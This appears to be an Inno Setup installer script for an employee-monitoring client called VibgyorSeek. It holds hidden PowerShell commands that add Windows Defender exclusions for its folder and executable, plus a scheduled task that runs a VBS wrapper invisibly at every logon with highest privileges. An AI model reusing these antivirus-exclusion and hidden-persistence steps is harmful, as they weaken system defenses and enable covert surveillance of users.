[Setup]
AppName=VibgyorSeek Monitoring
AppVersion=1.0
DefaultDirName={commonpf}\VibgyorSeekMonitoring
DefaultGroupName=VibgyorSeek Monitoring
OutputDir=.
OutputBaseFilename=VibgyorSeekSetup
Compression=lzma
SolidCompression=yes
PrivilegesRequired=admin

[Files]
Source: "VibgyorSeekMonitoring.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "VibgyorSeekMonitoring_Hidden.vbs"; DestDir: "{app}"; Flags: ignoreversion
Source: ".env"; DestDir: "{app}"; Flags: ignoreversion

[Run]
; Add Windows Defender exclusions BEFORE creating the task
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}' -Force"""; Flags: runhidden; StatusMsg: "Adding antivirus exclusion..."

; Also exclude the executable specifically
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionProcess 'VibgyorSeekMonitoring.exe' -Force"""; Flags: runhidden; StatusMsg: "Adding antivirus exclusion..."

; Create scheduled task using VBS wrapper for guaranteed hidden execution
Filename: "{sys}\schtasks.exe"; Parameters: "/create /tn ""VibgyorSeek Monitoring"" /xml ""{tmp}\task.xml"" /f"; Flags: runhidden waituntilterminated; StatusMsg: "Creating scheduled task..."

; Start the task immediately
Filename: "{sys}\schtasks.exe"; Parameters: "/run /tn ""VibgyorSeek Monitoring"""; Flags: runhidden waituntilterminated; StatusMsg: "Starting monitoring client..."

[UninstallRun]
; Stop the task if running
Filename: "{sys}\schtasks.exe"; Parameters: "/end /tn ""VibgyorSeek Monitoring"""; Flags: runhidden; RunOnceId: "StopTask"

; Remove scheduled task
Filename: "{sys}\schtasks.exe"; Parameters: "/delete /tn ""VibgyorSeek Monitoring"" /f"; Flags: runhidden; RunOnceId: "RemoveTask"

; Remove Windows Defender exclusions
Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Remove-MpPreference -ExclusionPath '{app}' -Force"""; Flags: runhidden; RunOnceId: "RemoveExclusion1"

Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Remove-MpPreference -ExclusionProcess 'VibgyorSeekMonitoring.exe' -Force"""; Flags: runhidden; RunOnceId: "RemoveExclusion2"

[Code]
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
begin
  // Check if task already exists and remove it
  Exec(ExpandConstant('{sys}\schtasks.exe'), '/end /tn "VibgyorSeek Monitoring"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec(ExpandConstant('{sys}\schtasks.exe'), '/delete /tn "VibgyorSeek Monitoring" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := True;
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  TaskXML: AnsiString;
  XMLFile: String;
  VBSPath: String;
begin
  if CurStep = ssInstall then
  begin
    // Create XML file for scheduled task with VBS wrapper
    XMLFile := ExpandConstant('{tmp}\task.xml');
    VBSPath := ExpandConstant('{app}\VibgyorSeekMonitoring_Hidden.vbs');
    
    TaskXML := '<?xml version="1.0" encoding="UTF-16"?>' + #13#10 +
               '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">' + #13#10 +
               '  <RegistrationInfo>' + #13#10 +
               '    <Description>VibgyorSeek Employee Monitoring Client</Description>' + #13#10 +
               '    <Author>VibgyorSeek</Author>' + #13#10 +
               '  </RegistrationInfo>' + #13#10 +
               '  <Triggers>' + #13#10 +
               '    <LogonTrigger>' + #13#10 +
               '      <Enabled>true</Enabled>' + #13#10 +
               '    </LogonTrigger>' + #13#10 +
               '  </Triggers>' + #13#10 +
               '  <Principals>' + #13#10 +
               '    <Principal id="Author">' + #13#10 +
               '      <LogonType>InteractiveToken</LogonType>' + #13#10 +
               '      <RunLevel>HighestAvailable</RunLevel>' + #13#10 +
               '    </Principal>' + #13#10 +
               '  </Principals>' + #13#10 +
               '  <Settings>' + #13#10 +
               '    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>' + #13#10 +
               '    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>' + #13#10 +
               '    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>' + #13#10 +
               '    <AllowHardTerminate>true</AllowHardTerminate>' + #13#10 +
               '    <StartWhenAvailable>true</StartWhenAvailable>' + #13#10 +
               '    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>' + #13#10 +
               '    <IdleSettings>' + #13#10 +
               '      <StopOnIdleEnd>false</StopOnIdleEnd>' + #13#10 +
               '      <RestartOnIdle>false</RestartOnIdle>' + #13#10 +
               '    </IdleSettings>' + #13#10 +
               '    <AllowStartOnDemand>true</AllowStartOnDemand>' + #13#10 +
               '    <Enabled>true</Enabled>' + #13#10 +
               '    <Hidden>true</Hidden>' + #13#10 +
               '    <RunOnlyIfIdle>false</RunOnlyIfIdle>' + #13#10 +
               '    <WakeToRun>false</WakeToRun>' + #13#10 +
               '    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>' + #13#10 +
               '    <Priority>7</Priority>' + #13#10 +
               '  </Settings>' + #13#10 +
               '  <Actions Context="Author">' + #13#10 +
               '    <Exec>' + #13#10 +
               '      <Command>wscript.exe</Command>' + #13#10 +
               '      <Arguments>"' + VBSPath + '"</Arguments>' + #13#10 +
               '      <WorkingDirectory>' + ExpandConstant('{app}') + '</WorkingDirectory>' + #13#10 +
               '    </Exec>' + #13#10 +
               '  </Actions>' + #13#10 +
               '</Task>';
    
    SaveStringToFile(XMLFile, TaskXML, False);
  end;
end;
